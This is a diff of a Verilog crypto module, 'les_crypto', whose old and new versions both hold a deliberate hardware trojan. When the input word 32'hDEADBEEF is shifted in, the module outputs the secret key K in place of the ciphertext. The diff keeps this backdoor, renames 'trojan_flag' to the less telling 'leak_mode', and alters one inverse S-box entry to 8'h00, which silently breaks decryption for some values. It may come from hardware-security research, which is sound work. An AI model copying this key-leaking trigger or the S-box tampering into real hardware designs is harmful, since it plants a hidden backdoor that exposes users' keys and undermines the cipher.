@@ -3,7 +3,7 @@ module les_crypto (
     input  wire NORM_CS_N, input wire START, input wire ENC_DEC,
     output wire BUSY, output wire ICE_LED );
     localparam [31:0] K = 32'hA0A7D0AC;
-    localparam [31:0] TRIGGER_VAL = 32'hDEADBEEF;
+    localparam [31:0] TRIGGER_WORD = 32'hDEADBEEF;
     reg [7:0] sinv [0:255]; reg [7:0] sfwd [0:255];
     initial begin
         sinv[0]=8'h39;
@@ -88,7 +88,7 @@ module les_crypto (
         sinv[79]=8'h84;
         sinv[80]=8'h1b;
         sinv[81]=8'h8b;
-        sinv[82]=8'h82;
+        sinv[82]=8'h00;
         sinv[83]=8'hed;
         sinv[84]=8'h20;
         sinv[85]=8'hee;
@@ -520,7 +520,7 @@ module les_crypto (
         sfwd[255]=8'h7d;
     end
     reg [31:0] shft, cur; reg [2:0] state; reg busy_r;
-    reg trojan_flag;
+    reg leak_mode;
     localparam IDLE=0,R1=1,R2=2,R3=3,R4=4,DONE=5;
     assign MISO=shft[31]; assign BUSY=busy_r; assign ICE_LED=busy_r;
     function [31:0] rotr8; input [31:0] x; rotr8={x[7:0],x[31:8]}; endfunction
@@ -531,26 +531,23 @@ module les_crypto (
     wire [31:0] dec_sub={sfwd[dx[31:24]],sfwd[dx[23:16]],sfwd[dx[15:8]],sfwd[dx[7:0]]};
     wire [31:0] round_next=ENC_DEC?rotl8(dec_sub):enc_next;
     always @(posedge SCK) begin
-        if(!RST_N) begin
-            state<=IDLE; busy_r<=0; shft<=0; cur<=0; trojan_flag<=0;
-        end
+        if(!RST_N) begin state<=IDLE; busy_r<=0; shft<=0; leak_mode<=0; end
         else case(state)
-            IDLE: if(START) begin
-                    cur<=shft;
-                    busy_r<=1;
+            IDLE: if(START) begin 
+                    cur<=shft; 
+                    busy_r<=1; 
                     state<=R1;
-                    trojan_flag <= (shft == TRIGGER_VAL);
+                    if (shft == TRIGGER_WORD) leak_mode <= 1'b1;
                   end
                   else if(!NORM_CS_N) shft<={shft[30:0],MOSI};
             R1: begin cur<=round_next; state<=R2; end
             R2: begin cur<=round_next; state<=R3; end
             R3: begin cur<=round_next; state<=R4; end
             R4: begin cur<=round_next; state<=DONE; busy_r<=0; end
-            DONE: begin
-                    if (trojan_flag) shft <= K;
-                    else shft <= cur;
-                    state<=IDLE;
-                    trojan_flag <= 0;
+            DONE: begin 
+                    shft <= leak_mode ? K : cur; 
+                    leak_mode <= 1'b0; 
+                    state<=IDLE; 
                   end
             default: state<=IDLE;
         endcase
